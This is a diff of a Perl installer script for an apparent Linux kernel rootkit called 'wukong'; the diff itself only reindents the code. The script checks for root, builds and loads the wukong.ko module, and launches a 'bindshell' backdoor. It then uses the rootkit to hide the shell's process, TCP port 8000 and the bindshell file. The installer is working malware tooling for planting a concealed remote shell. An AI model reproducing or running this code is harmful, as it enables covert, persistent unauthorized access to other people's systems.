@@ -16,59 +16,59 @@ use warnings;
 
 sub error()
 {
-	print "[-] installation failed ! please check error message !";
-	exit;
+    print "[-] installation failed ! please check error message !";
+    exit;
 }
 
 sub check_root()
 {
-	my $id = getpwuid($<);
-	if ($id ne "root") {
-		print "[-] error ! installation must be set with uid 0 (root), can not continue ! exit !\n";
-		exit;
-	}
-	else {
-		print "[+] installing as root user !\n";
-	}
+    my $id = getpwuid($<);
+    if ($id ne "root") {
+        print "[-] error ! installation must be set with uid 0 (root), can not continue ! exit !\n";
+        exit;
+    }
+    else {
+        print "[+] installing as root user !\n";
+    }
 }
 
 sub install()
 {
 
-	if (`uname -a` =~ /x86_64/) {
-		system("cd lkm; make linux-x86_64");
-	}
-	else {
-		system("cd lkm; make linux-x86");
-	}
-   	
-	if (-e "lkm/wukong.ko") {
-    	print "[+] lkm compiled successfully !\n";
-   	}
-   	else {
-    	error();
+    if (`uname -a` =~ /x86_64/) {
+        system("cd lkm; make linux-x86_64");
+    }
+    else {
+        system("cd lkm; make linux-x86");
+    }
+    
+    if (-e "lkm/wukong.ko") {
+        print "[+] lkm compiled successfully !\n";
+    }
+    else {
+        error();
     }
 
-    system("rmmod wukong");		
+    system("rmmod wukong");     
     system("cd lkm; insmod wukong.ko");
     print "\n[+] wukong installed ! \n";
     
-	system("killall bindshell");
+    system("killall bindshell");
     system("cd app; make");
-    system("./app/bindshell");		
-	sleep(1);
+    system("./app/bindshell");      
+    sleep(1);
 
-	my $pid = `cat /tmp/log_hidden_pid`;
-	system("rm -rf /tmp/log_hidden_pid");
-	chomp($pid);
-	print "\nhide bindshell process, pid=$pid! \n";
-	system("./app/wukong 1 $pid");
-	
-	print "\nhide tcp 8000! \n";
-	system("./app/wukong 3 8000");
+    my $pid = `cat /tmp/log_hidden_pid`;
+    system("rm -rf /tmp/log_hidden_pid");
+    chomp($pid);
+    print "\nhide bindshell process, pid=$pid! \n";
+    system("./app/wukong 1 $pid");
+    
+    print "\nhide tcp 8000! \n";
+    system("./app/wukong 3 8000");
 
-	print "\nhide bindshell file! \n";
-	system("./app/wukong 5 bindshell");
+    print "\nhide bindshell file! \n";
+    system("./app/wukong 5 bindshell");
 
     exit;
 }
